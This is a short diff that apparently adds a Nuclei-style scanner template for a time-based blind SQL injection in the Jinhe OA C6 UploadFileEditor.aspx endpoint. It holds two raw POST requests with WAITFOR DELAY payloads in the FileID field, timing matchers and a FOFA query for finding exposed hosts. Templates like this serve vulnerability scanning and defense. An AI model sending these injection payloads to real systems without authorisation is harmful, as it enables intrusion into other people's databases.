@@ -1,0 +1,37 @@
+id: jinhe-OA-C6-UploadFileEditor-SQL
+
+info:
+  tags: jinhe-OA-C6-UploadFileEditor-SQL
+  name: jinhe-OA-C6-UploadFileEditor-SQL
+  author: xc
+  severity: high
+  description: jinhe-OA-C6-UploadFileEditor-SQL
+  metadata:
+    fofa-qeury: body="c6/Jhsoft.Web.login"
+    veified: true
+    max-request: 1
+
+http:
+  - raw:
+      - |
+        POST /C6/Control/UploadFileEditor.aspx HTTP/1.1
+        Host: 
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
+        Content-Type: application/x-www-form-urlencoded
+
+        FileID=1';WAITFOR+DELAY'0:0:4'--+
+
+      - |
+        POST /C6/Control/UploadFileEditor.aspx HTTP/1.1
+        Host: 
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
+        Content-Type: application/x-www-form-urlencoded
+
+        FileID=1';WAITFOR+DELAY'0:0:8'--+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration_1>=4 && duration_1<=5'  
+          - 'duration_2>=8 && duration_2<=9'
+        condition: and
